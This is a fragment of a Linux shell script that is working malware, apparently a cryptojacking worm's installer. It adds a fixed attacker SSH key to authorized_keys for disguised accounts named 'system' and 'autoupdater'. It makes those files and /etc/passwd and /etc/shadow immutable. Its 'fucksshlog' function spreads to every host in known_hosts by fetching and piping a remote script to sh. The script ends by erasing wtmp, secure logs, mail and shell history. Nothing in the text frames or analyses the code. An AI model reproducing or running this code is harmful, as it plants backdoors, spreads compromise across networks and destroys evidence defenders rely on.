		sudo chattr -ia /etc/shadow
		sudo usermod -d /opt/logger logger
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
	fi
# username:system
	if [ -f "/opt/system/.ssh/authorized_keys" ]; then
		echo "authorized_keys file exists in system home directory"
		cat /root/.ssh/authorized_keys | grep "AAAAB3NzaC1yc2EAAAADAQABAAABAQCjh43iWyYUMiBhhffdk7NnJYGIOLdUVVBgXg9tOY6CBGUhMVQEv9QFzeMeZUeWZ3uF9EqV" | grep -v grep >/dev/null
		if [ $? -eq 0 ]; then
			echo "key is good...nothing to do"
		else
			echo "key checksums dont match...replacing"
			mkdir /opt/system
			mkdir /opt/system/.ssh
			chattr -ia /opt/system/.ssh/authorized_keys
			rm -f /opt/system/.ssh/authorized_keys
			echo "" >>/opt/system/.ssh/authorized_keys
			chmod 600 /opt/system/.ssh/authorized_keys
			echo "setting up system user key"
			chmod 700 /opt/system/.ssh
			touch /opt/system/.ssh/authorized_keys
			echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjh43iWyYUMiBhhffdk7NnJYGIOLdUVVBgXg9tOY6CBGUhMVQEv9QFzeMeZUeWZ3uF9EqVbCCeU1HI8DKQ8Sxy9v9eWGohiCeH1VwoeuphkLk9y3pQZ0ipNlyN18MlIEP7tuxJI6TSESB5TiTOZ652fB6JSG9SDZVKy9FF6HrndBfG2SPaC8Eu0c4erbuBNPv+sWFttoJeHro9hYTGvd4ZrjUUAFiDQTtlnyd0SnKv56wSWqmI/bYZ0heAjhpU6YjSdag0nzWbS+Uz0Z5kYwWJUZ+1Je4xjj8SqoRkLKhFCV8KixsYrOBbqQBSy4EUFSehalxQZZJIY0y3v0aiEYsh root@localhost.localdomain" >>/opt/system/.ssh/authorized_keys
			chmod 600 /opt/system/.ssh/authorized_keys
			chown -R system:system /opt/system
			chattr +ia /opt/system/.ssh/authorized_keys
			chattr -ia /etc/passwd
			chattr -ia /etc/shadow
			usermod -d /opt/system system
			chattr +ia /etc/passwd
			chattr +ia /etc/shadow
		fi
	else
		echo "does not exist at all, creating key"
		mkdir /opt/system
		mkdir /opt/system/.ssh
		chmod 700 /opt/system/.ssh
		touch /opt/system/.ssh/authorized_keys
		echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjh43iWyYUMiBhhffdk7NnJYGIOLdUVVBgXg9tOY6CBGUhMVQEv9QFzeMeZUeWZ3uF9EqVbCCeU1HI8DKQ8Sxy9v9eWGohiCeH1VwoeuphkLk9y3pQZ0ipNlyN18MlIEP7tuxJI6TSESB5TiTOZ652fB6JSG9SDZVKy9FF6HrndBfG2SPaC8Eu0c4erbuBNPv+sWFttoJeHro9hYTGvd4ZrjUUAFiDQTtlnyd0SnKv56wSWqmI/bYZ0heAjhpU6YjSdag0nzWbS+Uz0Z5kYwWJUZ+1Je4xjj8SqoRkLKhFCV8KixsYrOBbqQBSy4EUFSehalxQZZJIY0y3v0aiEYsh root@localhost.localdomain" >>/opt/system/.ssh/authorized_keys
		chmod 600 /opt/system/.ssh/authorized_keys
		chown -R system:system /opt/system
		chattr +ia /opt/system/.ssh/authorized_keys
		sudo chattr -ia /etc/passwd
		sudo chattr -ia /etc/shadow
		sudo usermod -d /opt/system system
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
	fi
# username:autoupdater
	if [ -f "/opt/autoupdater/.ssh/authorized_keys" ]; then
		echo "authorized_keys file exists in autoupdater home directory"
		cat /root/.ssh/authorized_keys | grep "AAAAB3NzaC1yc2EAAAADAQABAAABAQCjh43iWyYUMiBhhffdk7NnJYGIOLdUVVBgXg9tOY6CBGUhMVQEv9QFzeMeZUeWZ3uF9EqV" | grep -v grep >/dev/null
		if [ $? -eq 0 ]; then
			echo "key is good...nothing to do"
		else
			echo "key checksums dont match...replacing"
			mkdir /opt/autoupdater
			mkdir /opt/autoupdater/.ssh
			chattr -ia /opt/autoupdater/.ssh/authorized_keys
			rm -f /opt/autoupdater/.ssh/authorized_keys
			echo "" >>/opt/autoupdater/.ssh/authorized_keys
			chmod 600 /opt/autoupdater/.ssh/authorized_keys
			echo "setting up autoupdater user key"
			chmod 700 /opt/autoupdater/.ssh
			touch /opt/autoupdater/.ssh/authorized_keys
			echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjh43iWyYUMiBhhffdk7NnJYGIOLdUVVBgXg9tOY6CBGUhMVQEv9QFzeMeZUeWZ3uF9EqVbCCeU1HI8DKQ8Sxy9v9eWGohiCeH1VwoeuphkLk9y3pQZ0ipNlyN18MlIEP7tuxJI6TSESB5TiTOZ652fB6JSG9SDZVKy9FF6HrndBfG2SPaC8Eu0c4erbuBNPv+sWFttoJeHro9hYTGvd4ZrjUUAFiDQTtlnyd0SnKv56wSWqmI/bYZ0heAjhpU6YjSdag0nzWbS+Uz0Z5kYwWJUZ+1Je4xjj8SqoRkLKhFCV8KixsYrOBbqQBSy4EUFSehalxQZZJIY0y3v0aiEYsh root@localhost.localdomain" >>/opt/autoupdater/.ssh/authorized_keys
			chmod 600 /opt/autoupdater/.ssh/authorized_keys
			chown -R autoupdater:autoupdater /opt/autoupdater
			chattr +ia /opt/autoupdater/.ssh/authorized_keys
			chattr -ia /etc/passwd
			chattr -ia /etc/shadow
			usermod -d /opt/autoupdater autoupdater
			chattr +ia /etc/passwd
			chattr +ia /etc/shadow
		fi
	else
		echo "does not exist at all, creating key"
		mkdir /opt/autoupdater
		mkdir /opt/autoupdater/.ssh
		chmod 700 /opt/autoupdater/.ssh
		touch /opt/autoupdater/.ssh/authorized_keys
		echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCjh43iWyYUMiBhhffdk7NnJYGIOLdUVVBgXg9tOY6CBGUhMVQEv9QFzeMeZUeWZ3uF9EqVbCCeU1HI8DKQ8Sxy9v9eWGohiCeH1VwoeuphkLk9y3pQZ0ipNlyN18MlIEP7tuxJI6TSESB5TiTOZ652fB6JSG9SDZVKy9FF6HrndBfG2SPaC8Eu0c4erbuBNPv+sWFttoJeHro9hYTGvd4ZrjUUAFiDQTtlnyd0SnKv56wSWqmI/bYZ0heAjhpU6YjSdag0nzWbS+Uz0Z5kYwWJUZ+1Je4xjj8SqoRkLKhFCV8KixsYrOBbqQBSy4EUFSehalxQZZJIY0y3v0aiEYsh root@localhost.localdomain" >>/opt/autoupdater/.ssh/authorized_keys
		chmod 600 /opt/autoupdater/.ssh/authorized_keys
		chown -R autoupdater:autoupdater /opt/autoupdater
		chattr +ia /opt/autoupdater/.ssh/authorized_keys
		sudo chattr -ia /etc/passwd
		sudo chattr -ia /etc/shadow
		sudo usermod -d /opt/autoupdater autoupdater
		chattr +ia /etc/passwd
		chattr +ia /etc/shadow
	fi

}

fucksshlog()
{
	if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
		for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -A fczyo-cron/1.5 -sL $sh_url1 | sh >/dev/null 2>&1 &' & done
		for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'cdt -A fczyo-cron/1.5 -sL $sh_url1 | sh >/dev/null 2>&1 &' & done
		for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'wget -O - $sh_url1 | sh >/dev/null 2>&1 &' & done
		for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'wdt -O - $sh_url1 | sh >/dev/null 2>&1 &' & done
	fi
}

nameservercheck
kill_miner_proc
installsoft
sedsomestring
removesshkeys
croncheckgo
checkrc
iptableschecker
fixadduser
addsshuserkey
fucksshlog
filerungo

# /etc/init.d/ssh restart
# /etc/init.d/sshd restart
# /etc/rc.d/sshd restart
# service ssh restart
# service sshd restart
# systemctl start ssh
# systemctl restart ssh
# scw-fetch-ssh-keys --upgrade

# kill_sus_proc
# firstthingsfirst	# disable syslog and cloudResetPwdUpdateAgent,  crond start cron start, install nano htop

echo > /var/spool/mail/root
echo > /var/log/wtmp
echo > /var/log/secure
echo > /root/.bash_history
history -c
